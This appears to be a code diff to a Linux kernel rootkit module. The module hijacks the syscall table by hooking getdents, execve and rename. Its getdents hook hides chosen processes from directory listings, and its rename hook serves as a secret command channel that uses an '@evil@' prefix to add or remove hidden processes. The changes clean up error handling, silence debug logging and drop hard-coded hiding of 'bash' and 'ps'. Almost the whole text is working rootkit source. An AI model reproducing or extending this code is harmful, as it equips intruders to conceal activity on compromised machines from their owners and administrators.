@@ -17,6 +17,8 @@
 #include <linux/cred.h>
 #include <linux/fdtable.h>
 #include <linux/dcache.h>
+#include <linux/err.h>
+
 char** dynamic_processes_to_hide;
 int arrayListSize;
 int maxArrayListSize;
@@ -156,7 +158,7 @@ asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                     bool flag = false;
                     int i;
                     for(i = 0; i < maxArrayListSize; i++){//check if the process is one of the listed override processes
-                        if(dynamic_processes_to_hide[i] != NULL && strcmp(process_name,dynamic_processes_to_hide[i]) == 0){
+                        if(dynamic_processes_to_hide[i] != NULL && strncmp(process_name,dynamic_processes_to_hide[i],15) == 0){
                             //printk("Match found for process to hide. Hiding from dirent entries.");
                             void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                             int removedEntrySize = d->d_reclen;
@@ -235,33 +237,33 @@ asmlinkage int new_execve(const char *pathname, char *const argv[], char *const 
 }
 
 asmlinkage int new_rename(const char* pathname, const char* action){
-    printk("rename called");
+//    printk("rename called");
     if(pathname == NULL || action == NULL || strlen(pathname) < 6 || strlen(action) < 6){//check if the pathname and action type is long enough for the prefix
         return original_rename(pathname,action);
     }
-    printk("%s",pathname);
-    printk("%s",action);
+//    printk("%s",pathname);
+//    printk("%s",action);
     if(strncmp(pathname,"@evil@",6) != 0 || strncmp(action,"@evil@",6) != 0){
         return original_rename(pathname,action);
     }
     if(strcmp(action,"@evil@addEntry") == 0){
         char* tempPath = kcalloc(strlen(pathname),1,GFP_KERNEL);
-        if(!tempPath){
-            return 12345;
+        if(IS_ERR_OR_NULL(tempPath)){
+            return -ENOMEM;
         }
         strcpy(tempPath,pathname+6);
-        printk("%s",tempPath);
+  //      printk("%s",tempPath);
         int result = addProcessToHide(tempPath);
         if(result == -ENOMEM)
-            return 12345;
+            return -ENOMEM;
         return 0;
     }
     if(strcmp(action,"@evil@removeEntry")==0){
         char* tempPath = kcalloc(strlen(pathname),1,GFP_KERNEL);
-        if(!tempPath)
-            return 12345;
+        if(IS_ERR_OR_NULL(tempPath))
+            return -ENOMEM;
         strcpy(tempPath,pathname+6);
-        printk("%s",tempPath);
+  //      printk("%s",tempPath);
         int result = deleteProcessToHide(tempPath);
         kfree(tempPath);
         return 0;
@@ -281,8 +283,9 @@ int init_module(){
 	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
     syscall_table[__NR_execve] = (unsigned long*)new_execve;
     syscall_table[__NR_rename] = (unsigned long*)new_rename;
+	printk("Syscall rename has number: %d",__NR_rename);
     dynamic_processes_to_hide = kcalloc(10,sizeof(char*),GFP_KERNEL);//create the array list;
-    if(!dynamic_processes_to_hide){
+    if(IS_ERR_OR_NULL(dynamic_processes_to_hide)){
         maxArrayListSize = -1;
         arrayListSize = -1;
     }
@@ -290,13 +293,13 @@ int init_module(){
         maxArrayListSize = 10;
         arrayListSize = 0;
     }
-    char* string = kcalloc(5,1,GFP_KERNEL);
+    /*char* string = kcalloc(5,1,GFP_KERNEL);
     char* string2 = kcalloc(5,1,GFP_KERNEL);
     strcpy(string,"bash");
     strcpy(string2,"ps");
     addProcessToHide(string);
-    addProcessToHide(string2);
-    printk("%d",maxArrayListSize);
+    addProcessToHide(string2);*/
+    //printk("Syscall rename number: %d",maxArrayListSize);
     write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
     return 0;
 }
